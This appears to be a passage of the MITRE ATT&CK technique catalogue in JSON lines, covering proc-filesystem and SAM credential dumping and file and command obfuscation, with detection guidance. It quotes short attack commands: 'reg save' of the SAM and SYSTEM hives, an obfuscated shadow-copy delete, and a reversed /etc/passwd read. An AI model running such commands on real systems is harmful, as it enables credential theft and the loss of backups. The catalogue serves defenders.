{"ID":"T1003.007","name":"OS Credential Dumping: Proc Filesystem","description":"Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns that are indicative of credentials, such as looking for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.","url":"https://attack.mitre.org/techniques/T1003/007","created":"11 February 2020","last modified":"15 April 2023","version":"1.1","tactics":"Credential Access","detection":"To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/\\*/maps</code>, where the <code>\\*</code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.","platforms":"Linux","data sources":"Command: Command Execution, File: File Access","is sub-technique":true,"sub-technique of":"T1003","defenses bypassed":null,"contributors":"Tim (Wadhwa-)Brown","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MimiPenguin GitHub May 2017),(Citation: Picus Labs Proc cump 2022),(Citation: GitHub LaZagne Dec 2018),"}
{"ID":"T1003.002","name":"OS Credential Dumping: Security Account Manager","description":"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n","url":"https://attack.mitre.org/techniques/T1003/002","created":"11 February 2020","last modified":"15 June 2022","version":"1.0","tactics":"Credential Access","detection":"Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.","platforms":"Windows","data sources":"Command: Command Execution, File: File Access, Windows Registry: Windows Registry Key Access","is sub-technique":true,"sub-technique of":"T1003","defenses bypassed":null,"contributors":"Ed Williams, Trustwave, SpiderLabs","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Mandiant APT1),(Citation: NCC Group APT15 Alive and Strong),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: TrueSec Gsecdump),(Citation: F-Secure CozyDuke),(Citation: GitHub Mimikatz lsadump Module),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Impacket Tools),(Citation: Wikipedia pwdump),(Citation: US-CERT TA18-074A),(Citation: FireEye APT33 Guardrail),(Citation: CME Github September 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Dell TG-3390),(Citation: Mandiant APT41),(Citation: Deply Mimikatz),(Citation: Github Koadic),(Citation: NCSC Joint Report Public Tools),(Citation: F-Secure The Dukes),(Citation: McAfee Night Dragon),(Citation: Github AD-Pentest-Script),(Citation: CrowdStrike IceApple May 2022),(Citation: Symantec Backdoor.Mivast),(Citation: cobaltstrike manual),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Cybereason Soft Cell June 2019),(Citation: Microsoft Disable NTLM Nov 2012)"}
{"ID":"T1027","name":"Obfuscated Files or Information","description":"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ","url":"https://attack.mitre.org/techniques/T1027","created":"31 May 2017","last modified":"30 March 2023","version":"1.4","tactics":"Defense Evasion","detection":"Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, File: File Metadata, Module: Module Load, Process: OS API Execution, Process: Process Creation, Script: Script Execution, WMI: WMI Creation, Windows Registry: Windows Registry Key Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Application Control, Host Forensic Analysis, Host Intrusion Prevention Systems, Log Analysis, Signature-based Detection","contributors":"Christiaan Beek, @ChristiaanBeek; Red Canary","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Palo Alto Comnie),(Citation: Novetta Blockbuster RATs),(Citation: ProofPoint Ursnif Aug 2016),(Citation: McAfee Lazarus Nov 2020),(Citation: ESET InvisiMole June 2018),(Citation: Fysbis Dr Web Analysis),(Citation: Unit42 Emissary Panda May 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: CoinTicker 2019),(Citation: Leonardo Turla Penquin May 2020),(Citation: Talos Promethium June 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Securelist Darkhotel Aug 2015),(Citation: Kaspersky Sofacy),(Citation: Mandiant APT1 Appendix),(Citation: Securelist APT10 March 2021),(Citation: ESET PipeMon May 2020),(Citation: FireEye HAWKBALL Jun 2019),(Citation: DFIR Conti Bazar Nov 2021),(Citation: RecordedFuture WhisperGate Jan 2022),(Citation: CISA SoreFang July 2016),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Symantec Remsec IOCs),(Citation: jRAT Symantec Aug 2018),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: FireEye Ransomware Feb 2020),(Citation: Arxiv Avaddon Feb 2021),(Citation: Unit 42 NOKKI Sept 2018),(Citation: ESET Carbon Mar 2017),(Citation: Unit 42 Valak July 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: G Data Sodinokibi June 2019),(Citation: Palo Alto Shamoon Nov 2016),(Citation: McAfee Sharpshooter December 2018),(Citation: Proofpoint TA416 Europe March 2022),(Citation: FireEye Clandestine Wolf),(Citation: Accenture Hogfish April 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Sophos SamSam Apr 2018),(Citation: FireEye Fin8 May 2016),(Citation: Proofpoint TA416 November 2020),(Citation: FireEye Hancitor),(Citation: ASERT InnaputRAT April 2018),(Citation: Securelist ShadowPad Aug 2017),(Citation: ESET Attor Oct 2019),(Citation: Medium S2W WhisperGate January 2022),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: McAfee Sodinokibi October 2019),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Microsoft NICKEL December 2021),(Citation: ESET LightNeuron May 2019),(Citation: Fidelis INOCNATION),(Citation: McAfee Maze March 2020),(Citation: Picus Sodinokibi January 2020),(Citation: FireEye FIN7 Oct 2019),(Citation: Cybereason Bazar July 2020),(Citation: Bromium Ursnif Mar 2017),(Citation: ESET Ebury Feb 2014),(Citation: HP SVCReady Jun 2022),(Citation: Infoblox Lokibot January 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: ESET Operation Groundbait),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Mandiant APT41),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Unit 42 Hildegard Malware),(Citation: Check Point Sunburst Teardrop December 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: FireEye POSHSPY April 2017),(Citation: FireEye FiveHands April 2021),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: BlackBerry Amadey 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: TrendMicro Lazarus Nov 2018),(Citation: ATT Sidewinder January 2021),(Citation: ESET Grandoreiro April 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Talos Remcos Aug 2018),(Citation: GitHub Invoke-Obfuscation),(Citation: Talos Seduploader Oct 2017),(Citation: Morphisec ShellTea June 2019),(Citation: PaloAlto NanoCore Feb 2016),(Citation: ANSSI Sandworm January 2021),(Citation: Anomali Rocke March 2019),(Citation: Juniper IcedID June 2020),(Citation: McAfee Night Dragon),(Citation: Talos Bisonal Mar 2020),(Citation: Lotus Blossom Jun 2015),(Citation: Trend Micro Muddy Water March 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Cybereason Bumblebee August 2022),(Citation: Proofpoint TA505 October 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: FireEye NETWIRE March 2019),(Citation: Forcepoint Monsoon),(Citation: Unit42 BendyBear Feb 2021),(Citation: FireEye APT41 March 2020),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Securelist BlackOasis Oct 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Unit42 OilRig Nov 2018),(Citation: TrendMicro TropicTrooper 2015),(Citation: Qualys LolZarus),(Citation: TrendMicro EarthLusca 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Dell Sakula),(Citation: ESET GreyEnergy Oct 2018),(Citation: Novetta Blockbuster Loaders),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Symantec Darkmoon Aug 2005),(Citation: ESET Industroyer),(Citation: Dell TG-3390),(Citation: Kaspersky Lyceum October 2021),(Citation: Talos Group123),(Citation: Kaspersky StoneDrill 2017),(Citation: Proofpoint ZeroT Feb 2017),(Citation: GDATA Zeus Panda June 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Securelist ScarCruft May 2019),(Citation: Fortinet Agent Tesla April 2018),(Citation: FireEye Periscope March 2018),(Citation: Trend Micro KillDisk 1),(Citation: SentinelLabs Metador Sept 2022),(Citation: Cylance Shell Crew Feb 2017),(Citation: Palo Alto Reaver Nov 2017),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Securelist LuckyMouse June 2018),(Citation: ESET Kobalos Feb 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Lotus Blossom Dec 2015),(Citation: Talos Micropsia June 2017),(Citation: Palo Alto Sofacy 06-2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Kaspersky MoleRATs April 2019),(Citation: Symantec RAINDROP January 2021),(Citation: Citizen Lab Group5),(Citation: MacKeeper Bundlore Apr 2019),(Citation: GitHub Sliver C2),(Citation: Accenture HyperStack October 2020),(Citation: FireEye CARBANAK June 2017),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Trend Micro Conficker),(Citation: Trustwave Pillowmint June 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: F-Secure Sofacy 2015),(Citation: Unit 42 KerrDown February 2019),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Bisonal July 2018),(Citation: Checkpoint IndigoZebra July 2021),(Citation: FireEye APT34 Dec 2017),(Citation: ESET Sednit Part 2),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Symantec Ukraine Wipers February 2022),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Checkpoint Dridex Jan 2021),(Citation: Proofpoint TA505 Jan 2019),(Citation: RedCanary Mockingbird May 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Secureworks Karagany July 2019),(Citation: Cybereason Valak May 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: ESET Sednit Part 1),(Citation: SentinelOne Valak June 2020),(Citation: Unit 42 Sofacy Feb 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: fsecure NanHaiShu July 2016),(Citation: CarbonBlack Conti July 2020),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Lazarus APT January 2022),(Citation: Kaspersky TajMahal April 2019),(Citation: Securelist Remexi Jan 2019),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Eset Ramsay May 2020),(Citation: ESET Gelsemium June 2021),(Citation: FBI FLASH APT39 September 2020),(Citation: Microsoft FinFisher March 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: FireEye APT28),(Citation: Cybereason Soft Cell June 2019),(Citation: NSA/FBI Drovorub August 2020),(Citation: CheckPoint Naikon May 2020),(Citation: ESET LoudMiner June 2019),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Trend Micro TeamTNT),(Citation: McAfee Cuba April 2021),(Citation: F-Secure CozyDuke),(Citation: CopyKittens Nov 2015),(Citation: Lookout Dark Caracal Jan 2018),(Citation: ESET ForSSHe December 2018),(Citation: Prevx Carberp March 2011),(Citation: FinFisher Citation),(Citation: FireEye FELIXROOT July 2018),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Kaspersky Turla),(Citation: Cylance Dust Storm),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: FireEye APT19),(Citation: ESET Turla PowerShell May 2019),(Citation: Novetta Winnti April 2015),(Citation: Malwarebytes Higaisa 2020),(Citation: Symantec Frutas Feb 2013),(Citation: Talos GravityRAT),(Citation: NCC Group WastedLocker June 2020),(Citation: MDSec Brute Ratel August 2022),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: BlackBerry Bahamut),(Citation: Trend Micro Daserf Nov 2017),(Citation: Malwarebytes Pony April 2016),(Citation: Microsoft DUBNIUM July 2016),(Citation: Palo Alto OilRig May 2016),(Citation: Zscaler Higaisa 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: ESET RTM Feb 2017),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: MSTIC FoggyWeb September 2021),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Malwarebytes SmokeLoader 2016),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: Cyble Sidewinder September 2020),(Citation: Proofpoint TA505 Sep 2017),(Citation: Symantec Elderwood Sept 2012),(Citation: Secureworks REvil September 2019),(Citation: CISA Supernova Jan 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Cybereason Oceanlotus May 2017),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Securelist WhiteBear Aug 2017),(Citation: CISA AppleJeus Feb 2021),(Citation: SecureWorks August 2019),(Citation: S2 Grupo TrickBot June 2017),(Citation: ESET OceanLotus),(Citation: McAfee Lazarus Jul 2020),(Citation: Aqua TeamTNT August 2020),(Citation: Trustwave GoldenSpy2 June 2020),(Citation: Symantec Gallmaker Oct 2018),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Bitdefender StrongPity June 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Gamaredon June 2020),(Citation: Cybereason Conti Jan 2021),(Citation: Group IB GrimAgent July 2021),(Citation: NCC Group Team9 June 2020),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Cisco H1N1 Part 1),(Citation: Threatpost Hancitor),(Citation: McAfee Honeybee),(Citation: Talos SamSam Jan 2018),(Citation: Palo Alto DNS Requests),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET OceanLotus macOS April 2019),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Bitdefender Naikon April 2021),(Citation: Trend Micro Tick November 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: iSight Sandworm Oct 2014),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Unit 42 OilRig Sept 2018),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: CrowdStrike Putter Panda),(Citation: Nccgroup Emissary Panda May 2018),(Citation: ESET Dukes October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Unit 42 Nokki Oct 2018),(Citation: Unit 42 CARROTBAT January 2020),(Citation: Intel 471 REvil March 2020),(Citation: Fortinet Diavol July 2021),(Citation: CISA EB Aug 2020),(Citation: Group IB Ransomware May 2020),(Citation: ESET Lazarus Jun 2020),(Citation: ESET TeleBots Oct 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Radware Micropsia July 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Recorded Future REDDELTA July 2020),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: ESET Sednit USBStealer 2014),(Citation: Symantec Security Center Trojan.Kwampirs),(Citation: ESET Operation Spalax Jan 2021),(Citation: Trend Micro Waterbear December 2019),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Novetta Blockbuster),(Citation: objective-see windtail2 jan 2019),(Citation: Secureworks MCMD July 2019),(Citation: Symantec Whitefly March 2019),(Citation: CISA ComRAT Oct 2020),(Citation: ESET EvilNum July 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Emissary Trojan Feb 2016),(Citation: ESET Hermetic Wizard March 2022),(Citation: PaloAlto DNS Requests May 2016),(Citation: OilRig New Delivery Oct 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: Donut Github),(Citation: Medium Metamorfo Apr 2020),(Citation: Symantec Buckeye),(Citation: ESET InvisiMole June 2020),(Citation: Symantec Cicada November 2020),(Citation: Trend Micro Skidmap),(Citation: Novetta-Axiom),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Unit42 Redaman January 2019),(Citation: FireEye APT32 May 2017),(Citation: FireEye APT33 Guardrail),(Citation: ClearSky Lazarus Aug 2020),(Citation: Accenture Lyceum Targets November 2021),(Citation: Talos Smoke Loader July 2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Intezer HiddenWasp Map 2019),(Citation: ESET ComRAT May 2020),(Citation: Unit42 OilRig Playbook 2023),(Citation: ThreatConnect Kimsuky September 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: DustySky),(Citation: Kaspersky Lab SynAck May 2018),(Citation: Talos PoetRAT April 2020),(Citation: Cyberint Qakbot May 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Trend Micro njRAT 2018),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: TrendMicro MacOS April 2018),(Citation: NCC Group Fivehands June 2021),(Citation: Microsoft AMSI June 2015),(Citation: win10_asr)"}
{"ID":"T1027.001","name":"Obfuscated Files or Information: Binary Padding","description":"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) ","url":"https://attack.mitre.org/techniques/T1027/001","created":"05 February 2020","last modified":"30 March 2023","version":"1.2","tactics":"Defense Evasion","detection":"Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. ","platforms":"Linux, Windows, macOS","data sources":"File: File Metadata","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":"Anti-virus, Signature-based detection","contributors":"Martin Jirkal, ESET","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Symantec Orangeworm April 2018),(Citation: Palo Alto Comnie),(Citation: Check Point Black Basta October 2022),(Citation: NCC Group WastedLocker June 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: McAfee Maze March 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: SentinelOne NobleBaron June 2021),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: ESET Grandoreiro April 2020),(Citation: ESET OceanLotus),(Citation: Sophos SamSam Apr 2018),(Citation: BlackBerry CostaRicto November 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Trend Micro Tick November 2019),(Citation: Group IB Ransomware September 2020),(Citation: Zscaler Higaisa 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Avira Mustang Panda January 2020),(Citation: FinFisher Citation),(Citation: Proofpoint ZeroT Feb 2017),(Citation: ESET Gelsemium June 2021),(Citation: ASERT Donot March 2018),(Citation: Microsoft FinFisher March 2018),(Citation: ESET OceanLotus Mar 2019),(Citation: ESET Sednit Part 2),(Citation: FireEye APT28),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: ESET Dukes October 2019),(Citation: Emissary Trojan Feb 2016),(Citation: Haq 2014),(Citation: ESET Gamaredon June 2020),(Citation: Talos Bisonal Mar 2020),(Citation: Group IB GrimAgent July 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Cybereason Cobalt Kitty 2017),"}
{"ID":"T1027.010","name":"Obfuscated Files or Information: Command Obfuscation","description":"Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)","url":"https://attack.mitre.org/techniques/T1027/010","created":"14 March 2023","last modified":"24 March 2023","version":"1.0","tactics":"Defense Evasion","detection":null,"platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Metadata, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":null,"contributors":"George Thomas; Tim Peck; TruKno","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: FireEye Obfuscation June 2017),(Citation: FoxIT Wocao December 2019),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Securelist MuddyWater Oct 2018),(Citation: Costa AvosLocker May 2022),(Citation: Symantec Leafminer July 2018),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ATT Sidewinder January 2021),(Citation: Flashpoint FIN 7 March 2019),(Citation: GitHub Invoke-Obfuscation),(Citation: objsee mac malware 2017),(Citation: Github PowerShell Empire),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Sophos Netwalker May 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Microsoft Actinium February 2022),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: Bitdefender FIN8 July 2021),(Citation: ESET Gamaredon June 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Talos Cobalt Group July 2018),(Citation: Picus Emotet Dec 2018),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: ESET Machete July 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Talos MuddyWater Jan 2022),(Citation: GitHub PowerSploit May 2012),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: FireEye MuddyWater Mar 2018),(Citation: TrendMicro Netwalker May 2020),(Citation: Unit 42 Valak July 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Talos PoetRAT October 2020),(Citation: FireEye FIN7 Aug 2018),(Citation: ESET LoudMiner June 2019),(Citation: ESET Telebots Dec 2016),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Morphisec 